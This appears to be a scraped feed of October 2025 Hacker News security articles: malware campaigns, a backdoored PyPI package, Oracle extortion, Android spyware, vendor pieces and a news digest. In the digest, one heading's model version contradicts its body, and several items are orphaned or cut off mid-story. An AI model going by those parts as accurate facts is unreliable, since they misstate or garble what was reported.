""The group has demonstrated strong adaptability, layering obfuscation techniques to evade detection and tailoring its toolset to align with shifting intelligence-gathering priorities,"" Fortinet said. ""Its recent campaigns not only illustrate Confucius' persistence but also its ability to pivot rapidly between techniques, infrastructure, and malware families to maintain operational effectiveness.""

The disclosure comes as K7 Security Labs detailed an infection sequence associated with the Patchwork group that commences with a malicious macro that's designed to download a .LNK file containing PowerShell code responsible for downloading additional payloads and leveraging DLL side-loading to launch the primary malware while simultaneously displaying a decoy PDF document.
The final payload, for its part, establishes contact with the threat actor's command-and-control (C2) server, gathers system information, and retrieves an encoded instruction that's subsequently decrypted for execution using cmd.exe. It's also equipped to take screenshots, upload files from the machine, and download files from a remote URL and save them locally in a temporary directory.
""The malware waits for a configurable period and retries sending the data up to 20 times, tracking failures to ensure persistent and stealthy data exfiltration without alerting the user or security systems,"" the company said."
2025-10-06 11:11:04,"Oct 02, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/alert-malicious-pypi-package-soopsocks.html,"Alert: Malicious PyPI Package soopsocks Infects 2,653 Systems Before Takedown","Cybersecurity researchers have flagged a malicious package on the Python Package Index (PyPI) repository that claims to offer the ability to create a SOCKS5 proxy service, while also providing a stealthy backdoor-like functionality to drop additional payloads on Windows systems.
The deceptive package, named soopsocks, attracted a total of 2,653 downloads before it was taken down. It was first uploaded by a user named ""soodalpie"" on September 26, 2025, the same date the account was created.
""While providing this capability, it exhibits behavior as a backdoor proxy server targeting Windows platforms, using automated installation processes via VBScript or an executable version,"" JFrog said in an analysis.
The executable (""_AUTORUN.EXE"") is a compiled Go file that, besides including a SOCKS5 implementation as advertised, is also designed to run PowerShell scripts, set firewall rules, and relaunch itself with elevated permissions. It also carries out basic system and network reconnaissance, including Internet Explorer security settings and Windows installation date, and exfiltrates the information to a hard-coded Discord webhook.

""_AUTORUN.VBS,"" the Visual Basic Script launched by the Python package in versions 0.2.5 and 0.2.6, is also capable of running a PowerShell script, which then downloads a ZIP file containing the legitimate Python binary from an external domain (""install.soop[.]space:6969"") and generates a batch script that's configured to install the package using the ""pip install"" command and run it.
The PowerShell script then invokes the batch script, causing the Python package to be executed, which, in turn, elevates itself to run with administrative privileges (if not already), configure firewall rules to allow UDP and TCP communication via port 1080, install as a service, maintain communication with a Discord webhook, and set up persistence on the host using a scheduled task to make sure it automatically starts upon a system reboot.

""soopsocks is a well-designed SOCKS5 proxy with full bootstrap Windows support,"" JFrog said. ""However, given the way it performs and actions it takes during runtime, it shows signs of malicious activity, such as firewall rules, elevated permissions, various PowerShell commands, and the transfer from simple, configurable Python scripts to a Go executable with hardcoded parameters, version with reconnaissance capabilities to a predetermined Discord webhook."" 
The disclosure comes as npm package maintainers have raised concerns related to a lack of native 2FA workflows for CI/CD, self-hosted workflow support for trusted publishing, and token management following sweeping changes introduced by GitHub in response to a growing wave of software supply chain attacks, Socket said.
Earlier this week, GitHub said it will shortly revoke all legacy tokens for npm publishers and that all granular access tokens for npm will have a default expiration of seven days (down from 30 days) and a maximum expiration of 90 days, which used to be unlimited previously.

""Long-lived tokens are a primary vector for supply chain attacks. When tokens are compromised, shorter lifetimes limit the window of exposure and reduce potential damage,"" it said. ""This change brings npm in line with security best practices already adopted across the industry.""
It also comes as the software supply chain security firm released a free tool called Socket Firewall that blocks malicious packages at install time across npm, Python, and Rust ecosystems, giving developers the ability to safeguard their environments against potential threats.
""Socket Firewall isn't limited to protecting you from problematic top-level dependencies. It will also prevent the package manager from fetching any transitive dependency that is known to be malicious,"" the company added."
2025-10-06 11:11:08,"Oct 02, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/automating-pentest-delivery-7-key.html,Automating Pentest Delivery: 7 Key Workflows for Maximum Impact,"Penetration testing is critical to uncovering real-world security weaknesses. With the shift into continuous testing and validation, it is time we automate the delivery of these results.
The way results are delivered hasn't kept up with today's fast-moving threat landscape. Too often, findings are packaged into static reports, buried in PDFs or spreadsheets, and handed off manually to already-overloaded IT and engineering teams. By the time remediation begins, days or even weeks may have passed since the issues were first discovered.
As we explored in our recent article on how automation is redefining pentest delivery, static, manual processes no longer cut it. Security teams need faster insights, cleaner handoffs, and more consistent workflows if they want to keep pace with modern exposure management. 
That's where automation makes the difference, ensuring findings move seamlessly from discovery to remediation in real time.
Where Should You Start?
Knowing automation matters is only the first step. The bigger challenge is understanding where to start. Not every workflow carries equal impact, and trying to automate everything at once can be overwhelming. 
This article focuses on the seven key workflows that deliver the greatest immediate value. 
By automating these first, security teams can accelerate delivery, reduce friction, and build the foundation for a modern, scalable approach to penetration test delivery.
Platforms like PlexTrac help automate pentest finding delivery in real time through robust, rule-based workflows. (No waiting for the final report!)

1. Create Tickets for Remediation When Findings Are Discovered
One of the most powerful ways to accelerate penetration test delivery is by integrating findings directly into the tools that engineering and IT teams already use. Instead of manually transcribing vulnerabilities into Jira, ServiceNow, or Azure DevOps, automation can create remediation tickets the moment findings are published.
This ensures findings reach the right teams without delay, while eliminating the risk of human error during handoff. For organizations with multiple stakeholders — from internal IT groups to external clients — automated ticketing ensures everyone works within familiar systems, without adding new friction. The result is faster remediation cycles, bidirectional visibility between teams, and ensuring all findings are tracked and resolved promptly.

2. Auto-Close Informational Findings
Not every discovery requires action. Informational findings, while valuable for historical context, can clutter dashboards and distract teams from higher-priority risks. By automatically closing findings tagged as informational during scan ingestion, organizations can reduce triage noise and keep workflows streamlined.
This automation helps security leaders ensure their teams stay focused on what truly matters, while still retaining visibility into lower-level data if needed. It's a simple but effective way to declutter queues, improve dashboard accuracy, and give teams back valuable time.
3. Send Real-Time Alerts for Critical Findings
Critical vulnerabilities discovered in active environments need immediate attention, often before a report is finalized. With automation, real-time alerts can be pushed directly to communication channels like Slack, Microsoft Teams, email, or even text using custom webhooks based on the severity of the finding.
This workflow ensures high-severity issues are escalated instantly, enabling faster response and reducing risk exposure. In many cases, alerts can be paired with auto-ticket creation, sending findings to the right remediation team the moment they're identified. This proactive approach helps organizations shorten the time from discovery to mitigation.
4. Request Proofreading of Draft Findings
Delivering high-quality penetration tests requires collaboration and potentially multiple levels of review. Instead of sending manual messages asking teammates to review a draft or running into duplicate versioning issues, automation can trigger real-time notifications when findings are ready for proofreading.
This workflow promotes stronger peer review practices, reduces communication overhead, and helps teams scale their quality assurance process without slowing delivery. For junior analysts, it provides a structured way to involve more experienced team members in the editing process, ultimately improving the end deliverable.
5. Send Alerts When Findings Are Ready for Retest
Closing the loop on vulnerabilities is just as important as identifying them in the first place. Retesting is often delayed because communication between testing and remediation teams breaks down. By automating alerts when findings are ready for retest, organizations ensure timely follow-up and avoid SLA misses.
This workflow helps teams align more effectively, improves accountability, and reduces the risk of lingering vulnerabilities. It's a small but high-impact automation that strengthens trust in the overall pentesting process by ensuring that vulnerabilities are truly resolved.
6. Auto-Assign Findings to Users Based on Role, Team, or Asset Type
Findings can quickly get lost in the shuffle if they're not routed correctly. Manual assignment leads to delays, confusion, and even rework when issues land with the wrong team or individual. Automating assignment rules based on attributes like asset type, vulnerability category, or team role ensures findings are delivered directly to the subject matter experts best equipped to address them.
This targeted delivery not only speeds up triage but also reduces human error and boosts overall efficiency. Whether findings need to go to a specific department, system owner, or regional team, auto-assignment builds clarity into the remediation process and ensures accountability from day one.
7. Send Finding Updates to Client Portals or Alert Clients Directly
For service providers, keeping clients informed during and after a pentest is critical for trust and satisfaction. Instead of relying on periodic emails or manual updates, automation can send findings directly into client-facing portals or dashboards. Clients can also receive real-time alerts for critical issues, ensuring they have immediate visibility into high-severity risks.
This creates a bridge between security providers and their clients, enabling faster responses and stronger collaboration so providers can position themselves as trusted partners.
PlexTrac supports each of these capabilities through its Workflow Automation Engine. Explore their Workflow Automation Playbook for deeper guidance on how these automations work together. 

Automation Amplifies the Impact of Penetration Testers
By eliminating repetitive tasks, reducing delays, and ensuring findings reach the right people at the right time, automation frees teams to focus on what matters most: protecting the organization.
The seven workflows we've outlined are not only practical starting points, but also building blocks for more advanced automation in the future. Whether it's auto-assigning findings, streamlining retests, or delivering updates directly to stakeholders, each step helps create a more resilient, efficient, and collaborative security practice.
Want to see what automated pentest workflows look like in action? Platforms like PlexTrac help teams unify and accelerate delivery, remediation, and closure in one platform, enabling real-time delivery and standardized workflows across the entire vulnerability lifecycle."

Claude Now Finds Your Bugs

Anthropic Touts Safety Protections Built Into Claude Sonnet 4.6


      Anthropic said it has rolled out a number of safety and security improvements to Claude Sonnet 4.5, its latest coding focused model, that make it difficult for bad actors to exploit and secure the system against prompt injection attacks, 
      sycophancy (i.e., the tendency of an AI to echo and validate user beliefs no matter how delusional or harmful they may be), 
      and child safety risks. ""Claude's improved capabilities and our extensive safety training have allowed us to substantially improve the model's behavior, reducing concerning behaviors like sycophancy, deception, power-seeking, and the tendency to encourage delusional thinking,"" 
      the company said. ""For the model's agentic and computer use capabilities, we've also made considerable progress on defending against prompt injection attacks, one of the most serious risks for users of these capabilities."" 
      The AI company said the latest model has better defensive cybersecurity abilities, such as vulnerability discovery, patching, and basic penetration testing capabilities. However, it did acknowledge that these tools could be ""dual-use,"" meaning they might also potentially be used by malicious actors, as well as cybersecurity professionals. 
      Generative AI systems like those offered by Microsoft and OpenAI are at the forefront of a battle between companies providing sophisticated text and image generation capabilities and malicious actors looking to exploit them.
    





Scan Waves Hint Pre-Exploit Staging

Exploit Attempts Target CVE-2024-3400


      The SANS Internet Storm Center Security has disclosed its observation of a significant increase in internet-wide scans targeting the critical PAN-OS GlobalProtect vulnerability 
      (CVE-2024-3400). The vulnerability, disclosed last year, is a command injection vulnerability that could be exploited by an unauthenticated attacker to execute arbitrary code with root privileges on susceptible firewalls. 
      SANS ISC said it has detected specially crafted requests that seek to upload a TXT file and subsequently attempt to retrieve that file via an HTTP GET request. ""This will return a '403' error if the file exists, and a '404' error if the upload failed. It will not execute code,"" it 
      noted. ""The content of the file is a standard Global Protect session file, and will not execute. A follow-up attack would upload the file to a location that leads to code execution."" 
      In recent weeks, exploit attempts have also been registered against Hikvision cameras susceptible to an older flaw 
      (CVE-2017-7921), SANS ISC said.

      Central to the operation involves deceiving victims into authorizing a malicious connected app to their organization's Salesforce portal. 
      ""Over the past several months, UNC6040 has demonstrated repeated success in breaching networks by having its operators impersonate IT support personnel in convincing telephone-based social engineering engagements,"" it 
      said. 
      ""This approach has proven particularly effective in tricking employees, often within English-speaking branches of multinational corporations, into actions that grant the attackers access or lead to the sharing of sensitive credentials, ultimately facilitating the theft of the organization's Salesforce data. In all observed cases, attackers relied on manipulating end users, not exploiting any vulnerability inherent to Salesforce.""
    





Phishers Use Robots.txt to Block Reporters

Dozens of Crypto Phishing Pages Flagged


      Censys said it identified over 60 cryptocurrency phishing pages impersonating popular hardware wallet brands Trezor and Ledger through an analysis of robots.txt files. 
      These sites have an entry in the file: ""Disallow: /add_web_phish.php."" 
      ""Notably, the actor behind the pages attempted to block popular phishing reporting sites from indexing the pages by including endpoints of the phishing reporting sites in their own robots.txt file,"" the company said. 
      The unusual robots.txt pattern has also been discovered on several GitHub repositories, some of which date back to January 2025. 
      ""The misuse of robots.txt and the merge conflicts found in multiple READMEs could also suggest that the actor behind these pages is not well-versed in web development practices,"" security researcher Emily Austin 
      added.
    





Drive Pauses Syncs — Buys You Minutes

Google Drive Adds AI-Powered Smarts to Block Ransomware


      Google has announced that it's updating Google Drive for desktop with AI-powered ransomware detection to automatically stop file syncing and allow users to easily restore files with a few clicks. 
      ""Our AI-powered detection in Drive for desktop identifies the core signature of a ransomware attack — an attempt to encrypt or corrupt files en masse — and rapidly intervenes to put a protective bubble around a user's files by stopping file syncing to the cloud before the ransomware can spread,"" Google Cloud 
      said. 
      ""The detection engine adapts to novel ransomware by continuously analyzing file changes and incorporating new threat intelligence from VirusTotal. When Drive detects unusual activity that suggests a ransomware attack, it automatically pauses syncing of affected files, helping to prevent widespread data corruption across an organization's Drive and the disruption of work."" 
      Users subsequently receive an alert on their desktop and via email, guiding them to restore their files. The real-time ransomware detection capability is built atop a specialized AI model trained on millions of real victim files encrypted by various ransomware strains.
    






Imgur Cuts U.K. Users, Investigation Still Open

Imgur Blocks Access to Service in the U.K.


      Imgur, a popular image hosting platform with more than 130 million users, has blocked access to users in the U.K. after regulators signalled their intention to impose penalties over concerns around children's data. 
      The U.K.'s data watchdog, the Information Commissioner's Office (ICO), said it recently notified the platform's parent company, MediaLab AI, of plans to fine Imgur after investigating its approach to age checks and handling of children's personal data. 
      The probe was launched earlier this March. 
      ""Imgur's decision to restrict access in the U.K. is a commercial decision taken by the company,"" the ICO 
      said. 
      ""We have been clear that exiting the U.K. does not allow an organisation to avoid responsibility for any prior infringement of data protection law, and our investigation remains ongoing."" 
      In a help page, Imgur 
      confirmed U.K. users will not be able to log in, view content, or upload images.
    





App Could Collect Data — But Didn't (Observed)

Russia's MAX App Audited


      An audit of the Russian government's new MAX instant messenger mobile app has found no evidence of surveillance beyond accessing features necessary for the app to function.

      said. 
      ""Technically, the application had the ability to collect these data and send them, but experts did not record what happened. After revoking permits, the application does not record attempts to obtain these accesses again through requests or unauthorized.""
    





U.K. Demands Access — Targets Britons' Backups

U.K. Government Issues New Order to Access iCloud User Data


      The U.K. government has issued a new request for Apple to provide access to encrypted iCloud user data, this time focusing specifically on the ‌iCloud‌ data of British citizens, according to the Financial Times. 
      The request, issued in early September 2025, has demanded that Apple create a way for officials to access encrypted ‌iCloud‌ backups. 
      In February, Apple withdrew ‌iCloud‌'s Advanced Data Protection feature in the U.K. 
      Subsequent pushback from civil liberty groups and the U.S. government led to the U.K. apparently abandoning its plans to force Apple to weaken encryption protections and include a backdoor that would have enabled access to the protected data of U.S. citizens. 
      In late August, the Financial Times also reported that the U.K. government's secret order was ""not limited to"" Apple's ADP feature and included requirements for Apple to ""provide and maintain a capability to disclose categories of data stored within a cloud-based backup service,"" suggesting that the access was far broader in scope than previously known.
    





Car Hacks Work Remotely — Cars Still Unfixed

Apple CarPlay RCE Exploit Left Unpatched in Most Cars


      Back in April 2025, Oligo Security disclosed a set of flaws in AirPlay called 
      AirBorne (CVE-2025-24252 and CVE-2025-24132) that could be chained together to take over Apple CarPlay, in some cases, without even requiring any user interaction or authentication. 
      While the underlying technology uses the iAP2 protocol to establish a wireless connection over Bluetooth and negotiate a CarPlay Wi-Fi password to allow an iPhone to connect to the network and initiate screen mirroring, the researcher found that many devices and systems default to a ""No-PIN"" approach during the Bluetooth pairing phase, making the attacks ""frictionless and harder to detect."" 
      This, coupled with the fact that iAP2 does not authenticate the iPhone, meant that an attacker with a Bluetooth radio and a compatible iAP2 client can impersonate an iPhone, request the Wi-Fi credentials, trigger app launches, and issue any arbitrary iAP2 command. 
      From there, attackers can exploit CVE-2025-24132 to achieve remote code execution with root privileges. 
      ""Although patches for CVE-2025-24132 were published on April 29, 2025, only a few select vendors actually patched,"" Oligo 
      said. 
      ""To our knowledge, as of this post, no car manufacturer has applied the patch.""
    





New Rules: Companies Must Stop Hoarding Data

Russia Planning to Tighten Data Protection Laws


      Russia's Ministry of Digital Development is working on regulations to force companies to restrict the type of data they collect from citizens in the country, in the hopes of minimizing future leaks of confidential data. 
      ""Systems should not process information containing personal data beyond what is necessary to ensure business processes,"" 
      said Evgeny Khasin, acting director of the Ministry of Digital Development's cybersecurity department. 
      ""This is because many organizations tend to collect as much data as possible in order to interact with it in some way or use it for their own purposes, while the law stipulates that data should be minimized.""
    





EU Vote Split — Backdoors Lose Key Ally

Netherlands Says No to E.U. Chat Control


      The Dutch government has said it won't support Denmark's proposal for an E.U. Chat Control legislation to force tech companies to introduce encryption backdoors so as to scan communications for ""abusive material."" 
      The proposal is up for a vote on October 14. 
      The Electronic Frontier Foundation (EFF) has called the legislative proposal ""dangerous"" and tantamount to ""chat surveillance."" 
      Other E.U. countries that have opposed the controversial legislation include Austria, Czechia, Estonia, Finland, Luxembourg, and Poland.
    





Big Payout — Period Data Traded for Ads

Google and Flo Health to Settle Privacy Class Action Lawsuit


      Google has agreed to pay $48 million, and the menstrual tracking app Flo Health will pay $8 million to resolve a class action lawsuit alleging the app illegally shared people's health data. 
      Google is expected to set up a $48 million fund for Flo app users who entered information about menstruation or pregnancy from November 2016 until the end of February 2019. 
      In March 2025, defunct data analytics company Flurry said it would pay $3.5 million for harvesting sexual and reproductive health data from the period tracking app. 
      The complaint, filed in 2021, alleged that Flo used software development kits to allow Google, Meta, and Flurry to intercept users' communications within the app.

Algorithm to be Cloned — China Keeps Stake

U.S.-Led Consortium to Takeover TikTok Operations in the Country


      The U.S. government extended the deadline for ByteDance to divest TikTok's U.S. operations until December 16, 2025, making it the fourth such extension. 
      The development came as China said the U.S. spin-off of TikTok will use ByteDance's Chinese algorithm as part of a U.S.-agreed framework that includes ""licensing the algorithm and other intellectual property rights."" 
      The artificial intelligence (AI)-powered algorithm that underpins the app has been a source of concern among national security circles, as it could be manipulated to push Chinese propaganda or polarizing material to users. 
      China has also called the framework deal a ""win-win."" 
      Under the framework deal, about 80% of TikTok's U.S. business would be owned by a joint venture that includes Oracle, Silver Lake Partners, media mogul Rupert Murdoch, and Dell CEO Michael Dell, with ByteDance's stake dropping below 20% to comply with the national security law. 
      The divestiture also extends to other applications like Lemon8 and CapCut that are operated by ByteDance. 
      Furthermore, TikTok's algorithm will be copied and retrained using U.S. user data as part of the deal, with Oracle auditing the recommendation system. 
      The White House has also promised that all U.S. user data on TikTok will be stored on Oracle servers in the U.S.
    





New Stealer Climbs Fast — Linked to Vidar

Acreed Becomes the Third Biggest Infotealer


      An information stealer known as Acreed is gaining traction among threat actors, with a steady rise in Acreed logs in Russian-speaking forums. The stealer was first advertised on the Russian Market in February 2025 by a user named ""Nu####ez"" and is assessed to be a private project. As of September 2025, the top five information stealer strains included Rhadamanthys (33%), Lumma (33%), Acreed (17%), Vidar (12%), and StealC (5%). ""At the present time, Acreed is maybe a privately developed project, but our infrastructure analysis shows that it is also integrated in an existing ecosystem that overlaps with Vidar,"" Intrinsec

Forensics Tool Reused to Tunnel and Ransom

Warlock Ransomware Actors Use Velociraptor in Attacks


      Cybersecurity company Sophos said it observed Warlock ransomware actors (aka Storm-2603 or Gold Salem) abusing the legitimate open-source 
      Velociraptor digital forensics and incident response (DFIR) tool to establish a Visual Studio Code network tunnel within the compromised environment. Some of the incidents led to the deployment of the ransomware. Warlock 
      gained
prominence in July 2025 after it was found to be one of the first threat actors abusing a set of security flaws in Microsoft SharePoint called ToolShell to infiltrate target networks. The group has claimed 60 victims as of mid-September 2025, since starting its operations in March, including a Russian company, suggesting that it may be operating from outside the Kremlin. Microsoft has described it with moderate confidence as a China-based threat actor. The group has also been observed weaponizing the ToolShell flaws to drop an ASPX web shell that's used to download a Golang-based WebSockets server that allows continued access to the compromised server independently of the web shell. Furthermore, Gold Salem has employed the Bring Your Own Vulnerable Driver (BYOVD) technique to bypass security defenses by using a vulnerability (CVE-2024-51324) in the Baidu Antivirus driver BdApiUtil.sys to terminate EDR software. ""The emerging group demonstrates competent tradecraft using a familiar ransomware playbook and hints of ingenuity,"" Sophos 
      said.

Trackers Leak IDs — Stalking Made Simple

Tile Trackers Expose Users to Stalking Risks


      Tile location trackers leak sensitive information that can allow threat actors to track a device's location. That's according to researchers from the Georgia Institute of Technology, who reverse-engineered the location-tracking service and found that the devices leak MAC addresses and unique device IDs. 
      An attacker can take advantage of the absence of encryption protections to intercept and collect the information using a simple radio antenna, ultimately enabling them to track all of the company's customers. 
      ""Tile's servers can persistently learn the location of all users and tags, unprivileged adversaries can track users through Bluetooth advertisements emitted by Tile's devices, and Tile's anti-theft mode is easily subverted,"" the researchers 
      said in a study. 
      The issues were reported to its parent company Life360 in November 2024, following which it said a 
      ""number of improvements"" were rolled out to address the problem, without specifying what those were.
    





Quantum-Ready SSH Up 30% — TLS Lags

PQC Adoption for SSH Slowly Grows


      New statistics released by Forescout show that a quarter of all OpenSSH and 8.5% of all SSH servers now support post-quantum cryptography (PQC). 
      In contrast, TLSv1.3 adoption remains at 19% and TLSv1.2 – which does not support PQC – increased from 43% to 46%. 
      The report also found that manufacturing, oil and gas, and mining have the lowest PQC adoption rates, whereas professional and business services have the highest. 
      ""The absolute number of servers with PQC support grew from 11.5 million in April to almost 15 million in August, an increase of 30%,"" it 
      added.

Phish Kits Grab Duo Codes, Then Move Laterally

Attackers Steal Duo OTPs to Compromise Higher Ed Accounts


      An email phishing campaign has been spotted targeting entities in the higher education sector to steal credentials and Cisco Duo one-time passwords (OTPs) with the goal of compromising accounts, exfiltrating data, and launching lateral attacks. 
      ""Targets are funneled to spoofed sign-in portals that perfectly mimic university login pages,"" Abnormal AI 
      said. 
      ""Then, purpose-built phishing kits harvest both credentials and Duo one-time passwords (OTPs) through seamless multi-step flows. With these details in hand, attackers swiftly hijack accounts, hide their tracks with malicious mailbox rules, and launch lateral phishing campaigns within the same organization."" 
      More than 40 compromised organizations and over 30 targeted universities and colleges have been identified as part of the campaign.
    






Every breach has one thing in common: people. Whether it's a tricked employee, a careless click, or a decision to delay a patch — humans shape the outcome. Stay sharp, stay informed, and help others do the same."
2025-10-06 11:11:13,"Oct 02, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/google-mandiant-probes-new-oracle.html,Google Mandiant Probes New Oracle Extortion Wave Possibly Linked to Cl0p Ransomware,"Google Mandiant and Google Threat Intelligence Group (GTIG) have disclosed that they are tracking a new cluster of activity possibly linked to a financially motivated threat actor known as Cl0p.
The malicious activity involves sending extortion emails to executives at various organizations and claiming to have stolen sensitive data from their Oracle E-Business Suite.
""This activity began on or before September 29, 2025, but Mandiant's experts are still in the early stages of multiple investigations, and have not yet substantiated the claims made by this group,"" Genevieve Stark, Head of Cybercrime and Information Operations Intelligence Analysis at GTIG, told The Hacker News in a statement.

Stark further said the targeting is opportunistic, as opposed to focusing on specific industries, adding this modus operandi is consistent with prior activity associated with the Cl0p data leak site.
Mandiant CTO Charles Carmakal described the ongoing activity as a ""high-volume email campaign"" that's launched from hundreds of compromised accounts, with evidence suggesting that at least one of those accounts has been previously associated with activity from FIN11, which is a subset within the TA505 group. 
FIN11, per Mandiant, has engaged in ransomware and extortion attacks as far back as 2020. Previously, it was linked to the distribution of various malware families like FlawedAmmyy, FRIENDSPEAK, and MIXLABEL.
""The malicious emails contain contact information, and we've verified that the two specific contact addresses provided are also publicly listed on the Cl0p data leak site (DLS),"" Carmakal added. ""This move strongly suggests there's some association with Cl0p, and they are leveraging the brand recognition for their current operation.""
That said, Google said it does not have any evidence on its own to confirm the alleged ties, despite similarities in tactics observed in past Cl0p attacks. The company is also urging organizations to investigate their environments for evidence of threat actor activity.
It's currently not clear how initial access is obtained. However, according to Bloomberg, it's believed that the attackers compromised user emails and abused the default password reset function to gain valid credentials of internet-facing Oracle E-Business Suite portals, citing information shared by Halycon.
When reached for comment, Oracle told The Hacker News that it's ""aware that some Oracle E-Business Suite (EBS) customers have received extortion emails"" and that it's ongoing investigation has found the ""potential use of previously identified vulnerabilities that are addressed in the July 2025 Critical Patch Update.""

Rob Duhart, chief security officer at Oracle Corporation, has also urged customers to apply the latest Critical Patch Update to safeguard against the threat. The company, however, did not say which vulnerabilities are under active exploitation.
In recent years, the highly prolific Cl0p group has been attributed to a number of attack waves exploiting zero-day flaws in Accellion FTA, SolarWinds Serv-U FTP, Fortra GoAnywhere MFT, and Progress MOVEit Transfer platforms, successfully breaching thousands of organizations.
Update
Cybersecurity company Halcyon, in a report published Thursday, said the attackers are abusing the default password reset function to gain valid credentials. Specifically, it relies on local Oracle EBS accounts, bypassing SSO protections owing to the lack of MFA on these accounts, enabling the threat actors to trigger password resets via compromised email accounts and gain valid user access.
""Local accounts bypass enterprise SSO controls and often lack MFA, leaving thousands of organizations exposed,"" it said in an alert. ""Ransom demands have reached up to $50 million, with attackers providing proof of compromise including screenshots and file trees.""

2025-10-06 11:11:13,"Oct 02, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/how-to-close-threat-detection-gaps-your.html,How to Close Threat Detection Gaps: Your SOC's Action Plan,"Running a SOC often feels like drowning in alerts. Every morning, dashboards light up with thousands of signals; some urgent, many irrelevant. The job is to find the real threats fast enough to keep cases from piling up, prevent analyst burnout, and maintain client or leadership confidence.
The toughest challenges, however, aren't the alerts that can be dismissed quickly, but the ones that hide in plain sight. These tricky threats drag out investigations, create unnecessary escalations, and quietly drain resources over time.
Why Detection Gaps Keep Opening
What slows SOCs down isn't the flood of alerts alone but the way investigations get split across disconnected tools. Intel in one platform, detonation in another, enrichment in a third; every switch wastes time. Across hundreds of cases, those minutes add up to stalled investigations, unnecessary escalations, and threats that linger longer than they should.
Action Plan That Delivers 3× SOC Efficiency in Threat Detection
SOC teams looking to close detection gaps have found one approach that works: building detection as a continuous workflow, where every step reinforces the next. Instead of stalling in disconnected tools, analysts move through a process that flows, from filtering alerts to detonating suspicious files to validating indicators.
A recent ANY.RUN survey shows just how much this shift can change SOC performance:

95% of SOC teams reported faster investigations
94% of users said triage became quicker and clearer
21 minutes saved on MTTR for each case
Up to 58% more threats identified overall

3-step action plan with its impact when using ANY.RUN
Behind these numbers is more than speed. SOCs that adopted this workflow reduced alert overload, gained clearer visibility into complex attacks, and built confidence in compliance and reporting. Teams also grew faster in expertise, as analysts learned by doing rather than relying solely on static reports.
So how are these numbers possible? The answer lies in three practical steps SOC teams have already put into action. 
Let's look at how this plan works, and how you can implement it in your own workflows.
Step 1: Expand Threat Coverage Early
The earlier a SOC can spot an incident, the faster it can respond. Threat Intelligence Feeds give analysts fresh, actionable IOCs drawn from the latest malware campaigns; IPs, domains, and hashes seen in real-world attacks. Instead of chasing alerts blindly, teams start with data that reflects what's happening across the threat landscape right now.
TI Feeds as your first step in threat detection
With this early coverage, SOCs gain three key advantages: they catch incidents sooner, stay aligned with current threats, and cut down on noise that clutters Tier 1. In practice, that means a 20% decrease in Tier 1 workload and fewer escalations eating into senior analysts' time.
Don't let detection gaps slow your team down. Start with the 3-level process today and give your SOC the clarity and speed it needs.
Try ANY.RUN now

The best part is that Threat Intelligence Feeds are available in multiple formats with simple integration options, so they can plug directly into your existing SIEM, TIP, or SOAR setup without disrupting workflows.
By filtering out duplicates and irrelevant signals at the start, Threat Feeds free up resources and ensure analysts focus on the alerts that actually matter.
Step 2: Streamline Triage & Response with Interactive Sandbox
Once alerts are filtered, the next challenge is proving what's left. An interactive sandbox becomes the SOC's proving ground. Instead of waiting for static reports, analysts can detonate suspicious files and URLs in real time, watching behavior unfold step by step.
This approach exposes what most automated defenses miss; payloads that need clicks to activate, staged downloads that appear over time, and evasive tactics designed to fool passive detection.
ANY.RUN's sandbox analyzing complex threat
The result is faster, clearer answers:

Evasive attacks exposed before they can escalate
Actionable threat reports generated for quick response
Routine tasks minimized with automated investigations

In practice, SOCs achieve a 15-second median detection time, turning what used to be long, uncertain investigations into rapid, decisive outcomes.
By combining real-time visibility with automation, the sandbox gives specialists of all levels the confidence to act quickly, while freeing senior staff from spending hours on routine triage.
Step 3: Strengthen Proactive Defense with Threat Intelligence Lookup
Even with full sandbox results, one question always remains: has this threat been seen before? Knowing whether an IOC is part of a fresh campaign or one already circulating across industries can completely change how a SOC responds.
That's why the third step is implementing Threat Intelligence Lookup. By tapping into live attack data contributed by more than 15,000 SOCs worldwide, analysts instantly enrich their findings and connect isolated alerts to wider patterns.
TI Lookup search of attack and its relevant sandbox analyses
The advantages are clear:

Hidden threats uncovered through proactive hunting
Greater incident clarity with rich historical context
Real-time visibility into evolving campaigns

With access to 24× more IOCs than typical isolated sources, security professionals can validate faster, close tickets sooner, and anticipate what might be coming next.
This final step ensures that every investigation ends with stronger evidence; not just a snapshot of one case, but an understanding of how it fits into the bigger threat landscape.
Build a Stronger SOC With a Unified Detection Workflow
Closing detection gaps is possible by creating a workflow where every stage strengthens the next. With early filtering from Threat Feeds, real-time visibility from the sandbox, and global context from Lookup, SOCs move from fragmented detection to a continuous process that delivers measurable results: faster triage, fewer escalations, and up to 3× greater efficiency in threat detection.
Organizations worldwide are already seeing the benefits:

74% of Fortune 100 companies use ANY.RUN to reinforce SOC operations
15,000+ organizations have integrated it into their detection workflows
500,000+ users rely on it daily for malware analysis and threat intelligence

Boost your detection rate, cut investigation time, and strengthen SOC efficiency.

2025-10-06 11:11:17,"Oct 02, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/10/warning-beware-of-android-spyware.html,Warning: Beware of Android Spyware Disguised as Signal Encryption Plugin and ToTok Pro,"Cybersecurity researchers have discovered two Android spyware campaigns dubbed ProSpy and ToSpy that impersonate apps like Signal and ToTok to target users in the United Arab Emirates (U.A.E.).
Slovak cybersecurity company ESET said the malicious apps are distributed via fake websites and social engineering to trick unsuspecting users into downloading them. Once installed, both the spyware malware strains establish persistent access to compromised Android devices and exfiltrate data.
""Neither app containing the spyware was available in official app stores; both required manual installation from third-party websites posing as legitimate services,"" ESET researcher Lukáš Štefanko said. Notably, one of the websites distributing the ToSpy malware family mimicked the Samsung Galaxy Store, luring users into manually downloading and installing a malicious version of the ToTok app.""
The ProSpy campaign, discovered in June 2025, is believed to have been ongoing since 2024, leveraging deceptive websites masquerading as Signal and ToTok to host booby-trapped APK files that claim to be upgrades to the respective apps, namely Signal Encryption Plugin and ToTok Pro.
The use of ToTok as a lure is no coincidence, as the app was removed from Google Play and Apple App Store in December 2019 due to concerns that it acted as a spying tool for the U.A.E. government, harvesting users' conversations, locations, and other data.

The developers of ToTok subsequently went on to claim the removal was an ""attack perpetrated against our company by those who hold a dominant position in this market"" and that the app does not spy on users.
The rogue ProSpy apps are designed to request permissions to access contacts, SMS messages, and files stored on the device. It's also capable of exfiltrating device information.
